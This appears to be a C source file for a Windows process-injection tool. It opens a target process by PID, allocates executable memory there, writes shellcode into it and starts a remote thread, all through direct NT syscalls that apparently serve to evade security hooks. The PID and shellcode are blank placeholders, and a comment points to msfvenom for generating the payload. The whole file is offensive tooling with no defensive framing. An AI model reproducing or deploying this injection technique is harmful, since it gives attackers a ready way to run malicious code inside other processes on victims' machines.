#include <windows.h>
#include "syscalls.h"
#include <TlHelp32.h>
#include <stdio.h>


int main()

{
	HANDLE pHandle;
	CLIENT_ID cid;
	LPVOID mem_alloc = NULL;
	OBJECT_ATTRIBUTES objAttr;
	HANDLE hThread;
	int pid = ; // Put the PID of remote process in which to inject our shellcode into 

	unsigned char shellcode[] = {} // Put your shellcode in here, for testing purposes, a simple shellcode can be created using msfvenom 
	SIZE_T size = sizeof(shellcode);

	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	cid.UniqueProcess = (PVOID)pid;
	cid.UniqueThread = 0;

	NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &objAttr, &cid);
	NtAllocateVirtualMemory(pHandle, &mem_alloc, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	NtWriteVirtualMemory(pHandle, mem_alloc, &shellcode, sizeof(shellcode), 0);
	printf("[!] Shellcode at : 0x%p\n", mem_alloc);
	printf("[!] Press enter to continue execution\n");
	getchar();
	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pHandle, (LPTHREAD_START_ROUTINE)mem_alloc, NULL, FALSE, 0, 0, 0, NULL);

	// Execute final shellcode in memory by creating a thread 

	return 0;


}
